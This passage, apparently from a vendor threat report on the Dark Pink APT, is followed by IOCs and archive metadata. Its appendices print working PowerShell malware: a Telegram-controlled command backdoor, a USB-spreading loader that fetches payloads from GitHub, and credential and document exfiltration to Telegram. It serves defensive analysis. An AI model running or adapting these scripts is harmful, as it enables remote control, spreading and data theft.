the\nmachine.\n\n\n-----\n\n```\n(gwmi cim_logicaldisk|?{($_.drivetype -eq 2)-and(Test-path\n$($_.deviceid)\\\\)}).deviceid;\n\n(get-smbshare|?{($_.name -notlike \"*$\")-and($_.name -ne Users)-and($_.path -like\n*:\\\\*)}).path;\n\n(Get-SMBMapping|?{$_.Status -eq \"OK\"}).remotepath|?{$_ -notlike '*\\\\IPC$'}\n\n```\nThe threat actors can also issue a command to take a screenshot of the desktop of the\ncompromised device and save these in the %TEMP% directory. They then download the\nimages by issuing the below command.\n```\nAdd-type -AssemblyName System.Drawing\n\nAdd-Type -AssemblyName System.Windows.Forms\n\n[System.Windows.Forms.Screen]::AllScreens|%{\n\n  $bounds =$_.bounds;\n\n  if($bounds.width -lt 1920){$bounds.width=1920}\n\n  if($bounds.height -lt 1080){$bounds.height=1080}\n\n  $image = New-Object Drawing.Bitmap $bounds.width, $bounds.height\n\n  $graphics = [Drawing.Graphics]::FromImage($image)\n\n  $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)\n\n  $screen_file = \"$env:tmp\\\\$($_.DeviceName.replace('\\\\\\\\.\\\\',''))_$((getdate).tostring('yyyyMMddHHmmss')).png\"\n\n  $image.Save($screen_file)\n\n  $graphics.Dispose()\n\n  $image.Dispose()\n\n  $screen_file\n\n}\n\n\n```\n**Conclusion**\n\nAPT groups come and go, but the preliminary findings of Group-IB’s research into Dark Pink\nAPT demonstrates how threat actors can change course, leverage new TTPs, and achieve\ndevastating results. The threat actors behind Dark Pink were able, with the assistance of\ntheir custom toolkit, to breach the defenses of governmental and military bodies in a range of\ncountries in the APAC and European regions. Dark Pink’s campaign once again underlines\nthe massive dangers that spear-phishing campaigns pose for organizations, as even highly\nadvanced threat actors use this vector to gain access to networks, and we recommend that\norganizations continue to educate their personnel on how to detect these sorts of emails.\n\nAt this stage, Group-IB researchers can confidently say that Dark Pink was behind the\nsuccessful breaches of at least seven organizations, although we believe that this number\ncould be higher. In line with Group-IB’s zero-tolerance policy to cybercrime, our analysts will\ncontinue their diligent efforts to uncover Dark Pink’s origin and work to uncover more of the\nunique or peculiar TTPs utilized by this group. We will continue to issue proactive\nnotifications to any organization we find to have been breached by this particular threat\ngroup.\n\n\n-----\n\nIn this blog, we attempted to reveal how Group-IB s proprietary Threat Intelligence system,\nwhich detects attacks automatically, can identify the mechanics behind ongoing threat\ncampaigns. Our clients are the first to be informed about Dark Pink, along with other new\nAPT groups that may appear on the horizon, and they are also the first to obtain the names\nof compromised organizations, which helps them avoid supply-chain attacks and make their\nnetwork infrastructure more secure.\n**Recommendations**\n\nUse modern email protection measures to prevent initial compromise via spearphishing emails. We recommend Group-IB’s [Business Email Protection, which is able](https://www.group-ib.com/products/business-email-protection/)\nto counter these threats effectively.\nOrganizations should ensure they foster a cybersecurity culture in their workplace,\nwhich includes sufficient training to staff on how to identify phishing emails.\n\nEnsure that your security measures allow for proactive threat hunting that can help\nidentify threats that cannot be detected automatically.\n\nLimit access to file-sharing resources, with the exception of those used within the\norganization.\n\nMonitor the creation of LNK files in unusual locations, such as network drives and USB\ndevices.\n\nEnsure that you observe any use of commands and built-in tools that are frequently\nused for collecting information about the system and files.\n\nMaintaining a secure organization requires ongoing vigilance, and using a proprietary\n[solution such as Group-IB Threat Intelligence can help organizations shore up their](https://www.group-ib.com/products/threat-intelligence/)\nsecurity posture by equipping security teams with the latest insights into new and\nemerging threats.\n\nTry Group-IB Threat Intelligence now!\n\nOptimize strategic, operational and tactical decision-making with best-in-class cyber threat\nanalytics.\n\nRequest Threat Intelligence Demo Right Now\n\nIndicators of compromise\n\nFile indicators:\n\n\n-----\n\n```\nCucky:\n\nMD5: 926027F0308481610C85F4E3E433573B\n\nSHA1: 24F65E0EE158FC63D98352F9828D014AB239AE16\n\nSHA256: 9976625B5A3035DC68E878AD5AC3682CCB74EF2007C501C8023291548E11301A\n\nCtealer Loader:\n\nMD5: 728AFA40B20DF6D2540648EF845EB754\n\nSHA1: D8DF672ECD9018F3F2D23E5C966535C30A54B71D\n\nSHA256: C60F778641942B7B0C00F3214211B137B683E8296ABB1905D2557BFB245BF775\n\nPacked ctealer:\n\nMD5: 7EAF1B65004421AC07C6BB1A997487B2\n\nSHA1: 18CA159183C98F52DF45D3E9DB0087E17596A866\n\nSHA256: E3181EE97D3FFD31C22C2C303C6E75D0196912083D0C21536E5833EE7D108736\n\nMD5: 732091AD428419247BCE87603EA79F00\n\nSHA1: 142F909C26BD57969EF93D7942587CDF15910E34\n\nSHA256: E45DF7418CA47A9A4C4803697F4B28C618469C6E5A5678213AB81DF9FCC9FD51\n\n```\nFile path:\n```\n$env:tmp\\backuplog\n\n$env:tmp\\backuplog1\n\n$env:appdata\\archive.zip\n\n$env:appdata\\telegram.txt\n\n$env:tmp\\afkslfsa.csv\n\n$env:tmp\\AB.zip\n\n$Env:tmp\\AB\n\n\n```\nScheduled task name:\n```\nMicrosoft Idle\n\n\n```\nMutex:\n```\ngwgXSznM-Jz92k33A-uRcCCksA-9XAU93r5\n\n\n```\nRegistry path:\n\n\n-----\n\n```\nHKCU:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell\n\nHKCU\\Environment\\OSBuild\n\nHKCU\\Environment\\STMP\n\nHKCU\\Environment\\SYSPS\n\nHKCR:\\zolfile\\shell\\open\\command\n\nHKCR:\\zolofile\\shell\\open\\command\\zolo\n\nHKCU:\\Environment\\guid\n\nHKCU:\\Environment\\Update\n\nHKCU:\\Environment\\UserInitMprLogonScript\n\nHKCU:\\SOFTWARE\\\\Classes\\\\abcdfile\\shell\\abcd\\\n\nHKCU:\\SOFTWARE\\Classes\\.4ID\\\n\nHKCU:\\SOFTWARE\\Classes\\.abcd\n\nHKCU:\\SOFTWARE\\Classes\\.psr\n\nHKCU:\\SOFTWARE\\Classes\\.zol\n\nHKCU:\\SOFTWARE\\Classes\\.zolo\n\nHKCU:\\SOFTWARE\\Classes\\4IDfile\\shell\\open\\command\n\nHKCU:\\SOFTWARE\\Classes\\4IDfile\\shell\\open\\command\\\n\nHKCU:\\SOFTWARE\\Classes\\4IDfile\\shell\\open\\command\\DelegateExecute\n\nHKCU:\\SOFTWARE\\Classes\\4IDfile\\shell\\open\\command\\DelegateExecute\\\n\nHKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\n\nHKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\aaaa\n\nHKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\abcd\n\nHKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\open\\command\n\nHKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\open\\command\\abcd\n\nHKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\open\\command\\DelegateExecute\n\nHKCU:\\SOFTWARE\\Classes\\psrfile\\shell\\open\\command\n\nHKCU:\\SOFTWARE\\Classes\\psrfile\\shell\\open\\command -Name DelegateExecute\n\nHKCU:\\SOFTWARE\\Classes\\zolfile\\shell\\open\\command\\DelegateExecute\n\nHKCU:\\SOFTWARE\\Classes\\zolfile\\shell\\open\\command\\zolo\n\nHKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command\n\nHKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command -Name DelegateExecute\n\nHKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command -Name DelegateExecute\n\nHKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command -Name zolo\n\nHKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command -Name zolo -Value\n\nHKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command\\zolo\n\nHKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Forfiles\n\nHKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Psr\n\nHKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Recents\n\n```\n**APPENDIX A. TelePowerBot**\n\n\n-----\n\n```\n[System.Net.ServicePointManager]::SecurityProtocol=@(\"Tls12\",\"Tls11\",\"Tls\",\"Ssl3\")\n\n$token=\"CHANGED\"\n\n$id=CHANGED\n\n$mid=(gp \"HKCU:\\\\Environment\" -name Update).Update\n\n$guid = (gp \"HKCU:\\\\Environment\" -name guid).guid\n\n$ip=irm \"https://ifconfig.me/ip\"\n\nif( -not (New-Object System.Threading.Mutex($false, $guid)).WaitOne(1)){\n\n  exit\n\n}\n\nif($mid -and $guid){\n\n  irm -Uri \"https://api.telegram.org/bot$($token)/sendMessage?\nchat_id=$($id)&text=$guid :: $env:COMPUTERNAME :: $ip reconnected!\"\n\n}\n\nelse {\n\n  $guid = [guid]::NewGuid().guid\n\n  Set-ItemProperty \"HKCU:\\\\Environment\" -name \"GUID\" -value $guid\n\n  irm -Uri \"https://api.telegram.org/bot$($token)/sendMessage?\nchat_id=$($id)&text=$guid :: $env:COMPUTERNAME :: $ip new connection!\"\n\n}\n\nif($mid -isnot [int]){\n\n  $mid = 0\n\n}\n\nwhile(1){\n\n  Start-Sleep 60;\n\n  (irm -Uri \"https://api.telegram.org/bot$($token)/getUpdates\").result|%{\n\n    if ($mid -lt $_.update_id) {\n\n      $mid=$_.update_id;\n\n      $name,$task=$_.message.text -split \" :: \";\n\n      if ( ($name -like $ip) -or ($name -like $env:COMPUTERNAME) -or ($name like $guid) -or ($name -like \"all\")) {\n\n        $message = $($task | iex)2>&1 | Out-String;\n\n        if (\"\" -eq $message){\n\n          $message=\"Task Done!\"\n\n        }\n\n        $b=0;\n\n        while ($b -lt $message.Length) {\n\n          $c = 4000;\n\n          if (($c + $b) -gt $message.Length){$c=$message.Length % 4000}\n\n          irm -Uri \"https://api.telegram.org/bot$($token)/sendMessage?\nchat_id=$($id)&text=$guid :: $env:COMPUTERNAME :: $ip answer message :\n$($_.message.message_id)`n$($message.Substring($b,$c))\"\n\n          $b+=$c\n\n        }\n\n      }\n\n    }\n\n    Set-ItemProperty \"HKCU:\\\\Environment\" -name \"Update\" -value $mid\n\n  }\n\n}\n\n```\nBack\n\n\n-----\n\n**APPENDIX B. PowerShell script to later movement over removable device**\n```\n[Net.ServicePointManager]::SecurityProtocol=@(\"Tls12\",\"Tls11\",\"Tls\",\"Ssl3\");\n\n$ErrorActionPreference=\"Continue\";\n\n$Query = \"select * from __InstanceCreationEvent within 5 where TargetInstance ISA\n'Win32_LogicalDisk' and TargetInstance.DriveType = 2\";\n\n$Action = {\n\n  (gwmi cim_logicaldisk|?{($_.drivetype -eq 2)-and(Test-path\n\"$($_.deviceid)\\\")}).DeviceID|%{\n\n    $uri = \"https://raw.githubusercontent.com/efimovah/abcd/main/xxx.gif\";\n\n    Start-BitsTransfer -Source $uri -Destination \"$Env:tmp\\xxx.zip\";\n\n    Expand-Archive -Path \"$env:temp\\xxx.zip\" -DestinationPath \"$env:temp\" -force\n\n    cp \"$env:temp\\xxx\" \"$_\\dism\" -Recurse -Force;\n\n    sc \"$_\\system.bat\" -value \"@echo off`ncd %cd%dism`nstart dism.exe`nexit\";\n\n    attrib +s +h \"$_\\dism\";attrib +s +h \"$_\\dism\\*.*\";attrib +s +h\n\"$_\\system.bat\";\n\n    (Gci \"$_\\\" -Directory -force)|?{$_.name -notin ('dism','$RECYCLE.BIN','System\nVolume Information')}|%{\n\n      attrib +s +h \"$($_.fullname)\"\n\n      $WshShell = New-Object -comObject WScript.Shell\n\n      $Shortcut = $WshShell.CreateShortcut(\"$($_.fullname).lnk\")\n\n      $Shortcut.TargetPath = \"%SystemRoot%\\System32\\cmd.exe\"\n\n      $Shortcut.Arguments = \"/c start explorer $($_.name) && system.bat &&\nexit\"\n\n      $Shortcut.IconLocation = \"%SystemRoot%\\System32\\SHELL32.dll,4\"\n\n      $Shortcut.WorkingDirectory = \"%cd%\"\n\n      $Shortcut.Save()\n\n    }\n\n  }\n\n};\nRegister-WmiEvent -Query $Query -Action $Action -SourceIdentifier USBFlashDrive\n\n\n```\nBack\n\n**APPENDIX C. PowerShell script to theft of credentials**\n\n\n-----\n\n```\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;\n[Reflection.Assembly]::Load([System.Convert]::FromBase64String((New-Object\nSystem.Net.WebClient).DownloadString(\"\n<https://raw.githubusercontent.com/efimovah/abcd/main/ZZZZZZZZZZZZZ.txt\\>\"))) | OutNull;[kuky.Program]::Main();\n\nStart-Sleep 60;\n\ncp -path \"$env:tmp\\\\backuplog\" -Destination \"$env:tmp\\\\backuplog1\" -recurse -force;\n$file = \"$env:tmp\\\\backuplog1\";\n\n$ascii = [System.Text.Encoding]::ascii;\n\nCompress-Archive -Path $File -Destination \"$file.zip\" -Force;\n\n$file = \"$file.zip\"\n\n$reg = \"HKCU:\\\\Environment\"\n\n$token,$chat_id = (gp $reg -name GUID).GUID -split \"::\"\n\nAdd-Type -AssemblyName System.Net.Http\n\n$form = new-object System.Net.Http.MultipartFormDataContent\n\n$form.Add($(New-Object System.Net.Http.StringContent $Chat_ID), 'chat_id')\n\n$Content = [System.IO.File]::ReadAllBytes($file)\n\n$byte = New-Object System.Net.Http.ByteArrayContent ($Content, 0, $Content.Length)\n\n$byte.Headers.Add('Content-Type','text/plain')\n\n$name = $ascii.getstring($ascii.getbytes(\"$($env:COMPUTERNAME)_$($file)\")) -replace\n':|\\\\\\\\|\\\\?','_'\n\n$form.Add($byte, 'document', $name)\n\n$ms = new-object System.IO.MemoryStream\n\n$form.CopyToAsync($ms).Wait()\n\nirm -Method Post -Body $ms.ToArray() -Uri \"\n<https://api.telegram.org/bot$token/sendDocument\\>\" -ContentType\n$form.Headers.ContentType.ToString()\n\nrm $file -Force -Recurse\",\n\n```\nBack\n\n**APPENDIX D. PowerShell script to exfiltrate documents from common network**\n**resource**\n\n\n-----\n\n```\n$extentions = @('.doc','.docx','.xls','.xlsx','.ppt','.pptx','.pdf');\n\n$file = \"$env:tmp\\\\documents_$((get-date).tostring('yyyyMMddHHmmss')).csv\"\n\ngdr -PsProvider FileSystem | Select Root | %{gci -Path $_.Root -Recurse -ErrorAction\nSilentlyContinue} | ?{$_.fullname -notmatch 'C:\\\\\\\\Program Files*|C:\\\\\\\\Windows*'} |\n?{$extentions -contains $_.Extension} | select name, fullname, LastWriteTime, length\n| Export-Csv -Path $file -encoding unicode;$file;\n\n$ascii = [System.Text.Encoding]::ascii;\n\nCompress-Archive -Path $File -Destination \"$file.zip\" -Force;\n\n$file = \"$file.zip\"\n\n$chat_id=CHANGED\n\n$token=\"CHANGED\"\n\nAdd-Type -AssemblyName System.Net.Http\n\n$form = new-object System.Net.Http.MultipartFormDataContent\n\n$form.Add($(New-Object System.Net.Http.StringContent $Chat_ID), 'chat_id')\n\n$Content = [System.IO.File]::ReadAllBytes($file)\n\n$byte = New-Object System.Net.Http.ByteArrayContent ($Content, 0, $Content.Length)\n\n$byte.Headers.Add('Content-Type','text/plain')\n\n$name = $ascii.getstring($ascii.getbytes(\"$($env:COMPUTERNAME)_$($file)\")) -replace\n':|\\\\\\\\|\\\\?','_'\n\n$form.Add($byte, 'document', $name)\n\n$ms = new-object System.IO.MemoryStream\n\n$form.CopyToAsync($ms).Wait()\n\nirm -Method Post -Body $ms.ToArray() -Uri\n\"https://api.telegram.org/bot$token/sendDocument\" -ContentType\n$form.Headers.ContentType.ToString()\n\nrm $file -Force -Recurse\n\n```\nBack\n\nIf you found this article helpful, share it with your friends!\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-01-11 - Dark Pink - New APT hitting Asia-Pacific, Europe that goes deeper and darker.pdf"
    ],
    "report_names": [
        "2023-01-11 - Dark Pink - New APT hitting Asia-Pacific, Europe that goes deeper and darker.pdf"
    ],
    "threat_actors": [
        {
            "id": "fd4c3ddd-11cc-4192-9c94-ff107d7f8492",
            "created_at": "2023-02-18T02:04:24.06294Z",
            "updated_at": "2025-03-27T02:02:09.850008Z",
            "deleted_at": null,
            "main_name": "Dark Pink",
            "aliases": [
                "Saaiwc Group"
            ],
            "source_name": "ETDA:Dark Pink",
            "tools": [
                "Ctealer",
                "Cucky",
                "KamiKakaBot",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "PowerSploit",
                "TelePowerBot",
                "ZMsg"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "4c68ccd0-caba-4189-9ead-86ac4c2d9b70",
            "created_at": "2024-05-01T02:03:07.930196Z",
            "updated_at": "2025-03-27T02:05:17.251237Z",
            "deleted_at": null,
            "main_name": "BRONZE ATLAS",
            "aliases": [
                "Axiom",
                "BARIUM ",
                "Blackfly ",
                "CTG-2633",
                "GREF",
                "Group 72 ",
                "Red Kelpie ",
                "TG-2633 ",
                "Wicked Panda ",
                "Winnti",
                "APT41 "
            ],
            "source_name": "Secureworks:BRONZE ATLAS",
            "tools": [
                " CCleaner v5.33 backdoor",
                " ChinaChopper",
                " Cobalt Strike",
                " Dicey MSDN",
                " ForkPlayground",
                " HUC Proxy Malware (Htran)",
                " Mimikatz",
                " PipeMon",
                " PlugX",
                " PortReuse",
                " Powershell Empire",
                " RCMD",
                " RbDoor",
                " SPEEDBOAT",
                " ShadowPad",
                " Sidewalk",
                " Speculoos",
                " TeamViewer",
                " Winnkit",
                " Winnti",
                " reg save",
                " vssadmin",
                "Acehash"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
            "created_at": "2023-01-06T13:46:38.376868Z",
            "updated_at": "2025-03-27T02:00:02.818071Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Cobalt Gypsy",
                "G0003",
                "Operation Cleaver",
                "Op Cleaver",
                "Tarh Andishan",
                "Alibaba",
                "TG-2889"
            ],
            "source_name": "MISPGALAXY:Cleaver",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "4d5f939b-aea9-4a0e-8bff-003079a261ea",
            "created_at": "2023-01-06T13:46:39.04841Z",
            "updated_at": "2025-03-27T02:00:02.985296Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "G0096",
                "Grayfly",
                "BARIUM",
                "BRONZE ATLAS",
                "BRONZE EXPORT",
                "Red Kelpie",
                "HOODOO",
                "Brass Typhoon",
                "TA415",
                "WICKED SPIDER",
                "WICKED PANDA",
                "G0044",
                "Earth Baku"
            ],
            "source_name": "MISPGALAXY:APT41",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e698860d-57e8-4780-b7c3-41e5a8314ec0",
            "created_at": "2022-10-25T15:50:23.287929Z",
            "updated_at": "2025-03-27T02:00:55.43005Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "APT41",
                "Wicked Panda",
                "Brass Typhoon",
                "BARIUM"
            ],
            "source_name": "MITRE:APT41",
            "tools": [
                "ASPXSpy",
                "BITSAdmin",
                "PlugX",
                "Impacket",
                "gh0st RAT",
                "netstat",
                "PowerSploit",
                "ZxShell",
                "KEYPLUG",
                "ipconfig",
                "sqlmap",
                "China Chopper",
                "ShadowPad",
                "MESSAGETAP",
                "Mimikatz",
                "certutil",
                "njRAT",
                "Cobalt Strike",
                "pwdump",
                "BLACKCOFFEE",
                "ROCKBOOT",
                "dsquery",
                "Winnti for Linux",
                "DUSTTRAP",
                "Derusbi",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1675303640,
    "ts_updated_at": 1743041776,
    "ts_creation_date": 1675237626,
    "ts_modification_date": 1675237626,
    "files": {
        "pdf": "https://archive.orkl.eu/bbd0cc80aab5bc184ffea6f01d3e8393213b7e20.pdf",
        "text": "https://archive.orkl.eu/bbd0cc80aab5bc184ffea6f01d3e8393213b7e20.txt",
        "img": "https://archive.orkl.eu/bbd0cc80aab5bc184ffea6f01d3e8393213b7e20.jpg"
    }
}